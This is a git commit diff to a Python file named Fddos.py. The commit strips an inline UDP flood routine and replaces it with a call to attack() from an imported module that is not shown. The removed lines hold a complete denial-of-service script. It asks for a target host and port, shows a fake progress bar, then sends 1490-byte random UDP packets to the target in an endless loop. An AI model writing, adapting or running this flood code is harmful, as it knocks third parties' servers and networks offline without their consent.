5800f8cd5b95bd0fc9c97a90e0b9d4e581280866
Ara Software <71103842+cr4ck3r1@users.noreply.github.com>
2020-11-20 14:55:36 +0300

    Update Fddos.py

--- Fddos.py
+++ Fddos.py
@@ -12,43 +12,7 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-##############
 
-os.system("cls")
-print ("")
-print ("")
-print ("   ARA SOFTWARE    ")
-print ("")
-host = input("name Target : ")
-ip = socket.gethostbyname(host)
-port = input("Port       : ")
-s = int(port)
+from att import attack
 
-os.system("cls")
-print ("")
-
-print ("[                    ] 0% ")
-time.sleep(3)
-print ("[=====               ] 25%")
-time.sleep(3)
-print ("[==========          ] 50%")
-time.sleep(3)
-print ("[===============     ] 75%")
-time.sleep(3)
-print ("[====================] 100%")
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,s))
-     sent = sent + 1
-     port = s + 1
-     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
-
-
-
-
+attack()
